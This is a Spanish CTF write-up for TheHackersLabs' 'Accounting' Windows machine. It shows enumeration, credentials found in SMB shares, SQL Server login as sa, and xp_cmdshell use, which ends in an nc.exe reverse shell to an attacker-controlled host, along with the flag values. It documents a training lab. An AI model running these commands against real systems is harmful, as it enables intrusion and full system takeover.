---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Accounting (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 11:32 EDT
Nmap scan report for 192.168.28.7
Host is up (0.00070s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1099/tcp  open  java-object   Java Object Serialization
1801/tcp  open  msmq?
2107/tcp  open  msrpc         Microsoft Windows RPC
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
7680/tcp  open  pando-pub?
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 (ASP.NET 4.0.30319)
|_http-server-header: Cassini/4.0.1.6
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9147/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2025-03-21T23:35:37+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-21T23:27:07
|_Not valid after:  2055-03-21T23:27:07
| ms-sql-ntlm-info: 
|   192.168.28.7\COMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
| ms-sql-info: 
|   192.168.28.7\COMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 49992
|_    Clustered: false
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1099-TCP:V=7.94SVN%I=7%D=3/21%Time=67DD8685%P=x86_64-pc-linux-gnu%r
SF:(NULL,4,"\xac\xed\0\x05");
MAC Address: 08:00:27:57:D3:AB (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:57:d3:ab (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-03-21T23:34:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.99 seconds
```

Vemos varias cosas interesantes, muchos puertos entre ellos bastantes interesantes como un `SMB`, `SQL Server`, `RDP`, etc... Pero entre todos esos puertos de primeras nos llama uno la antencion en el que hay un servicio web en el puerto `9081`, si entramos dentro veremos un login:

<figure><img src="../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Si intentamos las credenciales por defecto veremos que no se puede, por lo que vamos a realizar un poco de `fuuzing` para ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>:9081/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.7:9081/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Download             (Status: 200) [Size: 1302]
/Images               (Status: 200) [Size: 5633]
/Scripts              (Status: 200) [Size: 2484]
/add                  (Status: 200) [Size: 2321]
/app_browsers         (Status: 403) [Size: 1192]
/app_code             (Status: 403) [Size: 1192]
/app_data             (Status: 403) [Size: 1192]
/app                  (Status: 200) [Size: 2987]
/app_themes           (Status: 200) [Size: 1309]
/bin                  (Status: 403) [Size: 1192]
/css                  (Status: 200) [Size: 1938]
/docs                 (Status: 200) [Size: 3619]
/download             (Status: 200) [Size: 1302]
/images               (Status: 200) [Size: 5633]
/img                  (Status: 200) [Size: 1451]
```

Vemos que hay bastantes directorio interesantes, si vamos probando en uno de ellos llamado `/Download` veremos lo siguiente:

```
URL = http://<IP>:9081/Download
```

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Si entramos dentro de ese `notas.txt` veremos lo siguiente:

```
supervisor
supervisor
```

Podemos deducir que puede ser las credenciales del `login`, si lo probamos nos podremos meter como `administradores` pero no veremos nada interesante, ahora vamos a enumerar de forma anonima el servidor `SMB`.

## SMB

```shell
smbclient -L //<IP>/ -N
```

Info:

```
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        Compac          Disk      
        IPC$            IPC       IPC remota
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.28.7 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Vemos que aparecen `2` recursos compartidos interesantes `Compac` y `Users`, si entramos primero en `Compac` veremos lo siguiente:

```shell
smbclient -N //<IP>/Compac
```

Info:

```
  .                                   D        0  Fri May 10 22:49:15 2024
  ..                                  D        0  Fri May 10 22:49:15 2024
  Empresas                            D        0  Fri May 10 22:49:15 2024
  Index                               D        0  Fri May 10 22:50:09 2024

                5113953 blocks of size 4096. 509750 blocks available
```

Si nos vamos a la carpeta `Empresas` dentro veremos un archivo interesante llamado `SQL.txt`, nos lo descargaremos de la siguiente forma:

```shell
cd Empresas/
get SQL.txt
```

Y si leemos que contiene veremos lo siguiente:

```
SQL 2017 
Instancia COMPAC 
sa 
Contpaqi2023.

ip
127.0.0.1

Tip para terminar instalaciones
1) Ejecutar seguridad de icono
Sobre el icono asegurarse que diga ejecutar como Administrador.

2) Ejecutar el comando regedit...
Buscar la llave Hkey Local Machine, luego Software, luego Wow32, Computacion en Accion...(abri pantalla con boton del lado derecho
donde dice seguridad y ver que aparezca "everyone" y darle control total
```

Vemos que nos esta proporcionando unas credenciales, que son las siguientes:

```
User: sa
Pass: Contpaqi2023.
```

Estas credenciales podemos deducir que son del `SQL Server` que tiene la maquina `Windows`, por lo que haremos lo siguiente para conectarnos a dicho servidor.

## SQL Server

Si nos conectamos de forma normal no nos va a dejar ya que esta en otro puerto, por lo que tendremos que especificar el puerto que en este caso estara en el `49992`.

```shell
impacket-mssqlclient sa:"Contpaqi2023."@<IP_VICTIM> -p 49992
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed database context to 'master'.
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

Con esto veremos que estamos dentro de forma exitosa, ahora vamos a ver que comandos tenemos permitidos:

```powershell
help
```

Info:

```
lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

Vemos varias cosas interesantes, pero entre ellas veremos lo siguiente:

```
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
```

Con esto lo que podemos hacer es ejecutar comando de forma `privilegiada` por lo que ejecutaremos para probar un `whoami`:

```powershell
EXEC xp_cmdshell 'whoami';
```

Info:

```
output                
-------------------   
nt authority\system   

NULL 
```

Veremos que esta funcionando de forma correcta, por lo que ahora nos vamos a generar una `reverse shell` con `nc.exe` mediante un servidor de `SMB` que nos vamos a montar.

## Escalate Privileges

Vamos abrir en nuestro `host` un servidor de `SMB` de la siguiente forma:

```shell
cp /usr/share/windows-binaries/nc.exe .
```

Una vez copiado nuestro binario de `netcat` vamos abrirnos el servidor de `SMB`:

```shell
impacket-smbserver -smb2support kali .
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora vamos a ejecutar ese `nc.exe` desde nuestro servidor de `SMB` y generarnos una `reverse shell` como el usuario `administrador` ya que se esta ejecutando con privilegios elevados.

Vamos a ponernos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora en la maquina victima donde estamos en el `SQL Server` ejecutaremos lo siguiente:

```powershell
EXEC xp_cmdshell '\\<IP_ATTACKER>\kali\nc.exe -e cmd <IP_ATTACKER> <PORT>';
```

Ahora si nos vamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.7] 50027
Microsoft Windows [Versi�n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Veremos que ha funcionado y que seremos directamente `administradores` por lo que leeremos las `flags`.

> user.txt

```
bf79ead1586ea0cd464dd58257be9e30
```

> root.txt

```
                     ____...                                  
             .-"--"""".__    `.                                
            |            `    |                                
  (         `._....------.._.:          
   )         .()''        ``().                                
  '          () .=='  `===  `-.         
   . )       (         g)                                
    )         )     /        J          
   (          |.   /      . (                                  
   $$         (.  (_'.   , )|`                                 
   ||         |\`-....--'/  ' \                                
  /||.         \\ | | | /  /   \.                              
 //||(\         \`-===-'  '     \o.                            
.//7' |)         `. --   / (     OObaaaad888b.                 
(<<. / |     .a888b`.__.'d\     OO888888888888a.               
 \  Y' |    .8888888aaaa88POOOOOO888888888888888.              
  \  \ |   .888888888888888888888888888888888888b              
   |   |  .d88888P88888888888888888888888b8888888.             
   b.--d .d88888P8888888888888888a:f888888|888888b             
   88888b 888888|8888888888888888888888888\8888888
```
